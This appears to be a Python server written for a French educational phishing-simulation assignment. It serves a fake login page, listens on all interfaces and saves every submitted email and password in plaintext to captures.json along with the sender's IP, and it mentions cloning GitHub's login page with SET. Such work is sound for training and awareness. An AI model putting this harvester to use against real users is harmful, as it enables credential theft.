"""
Serveur local pour la simulation pédagogique du devoir phishing.
Enregistre les identifiants fictifs dans captures.json sur cette machine uniquement.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import socket
from pathlib import Path
from urllib.parse import parse_qs

PORT = 8765
HOST = "0.0.0.0"
ROOT = Path(__file__).resolve().parent
CAPTURES_FILE = ROOT / "captures.json"


class SimulationHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    def _read_payload(self):
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length)
        content_type = self.headers.get("Content-Type", "")

        if "application/json" in content_type:
            return json.loads(raw_body.decode("utf-8"))

        if "application/x-www-form-urlencoded" in content_type:
            form = parse_qs(raw_body.decode("utf-8"))
            return {
                "email": (form.get("email") or form.get("username") or [""])[0],
                "password": (form.get("password") or form.get("passwd") or [""])[0],
            }

        return json.loads(raw_body.decode("utf-8"))

    def _save_capture(self, payload):
        email = str(payload.get("email", "")).strip()
        password = str(payload.get("password", "")).strip()

        if not email or not password:
            self.send_error(400, "E-mail et mot de passe requis")
            return False

        entry = {
            "email": email,
            "password": password,
            "date": payload.get("date"),
            "source": self.client_address[0],
        }

        captures = []
        if CAPTURES_FILE.exists():
            with CAPTURES_FILE.open("r", encoding="utf-8") as file:
                captures = json.load(file)

        captures.append(entry)

        with CAPTURES_FILE.open("w", encoding="utf-8") as file:
            json.dump(captures, file, indent=2, ensure_ascii=False)

        print(f"[CAPTURE] {email} / {password} (depuis {self.client_address[0]})")
        return True

    def do_POST(self):
        if self.path != "/api/enregistrer":
            self.send_error(404, "Route introuvable")
            return

        try:
            payload = self._read_payload()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self.send_error(400, "Corps de requete invalide")
            return

        if not self._save_capture(payload):
            return

        response = json.dumps(
            {"ok": True, "message": "Enregistrement local effectue"}
        ).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}")


def local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"


def main():
    os.chdir(ROOT)
    ip = local_ip()
    server = HTTPServer((HOST, PORT), SimulationHandler)
    print(f"Serveur demarre sur toutes les interfaces : port {PORT}")
    print(f"Page locale : http://127.0.0.1:{PORT}/login-simulation.html")
    print(f"Page reseau : http://{ip}:{PORT}/login-simulation.html")
    print(f"API capture : http://{ip}:{PORT}/api/enregistrer")
    print("Avec SET (port 80) : clone GitHub puis ouvre http://127.0.0.1/ — le POST part vers le port 8765")
    print("Fichier de sortie : captures.json")
    print("Arret : Ctrl+C")
    server.serve_forever()


if __name__ == "__main__":
    main()
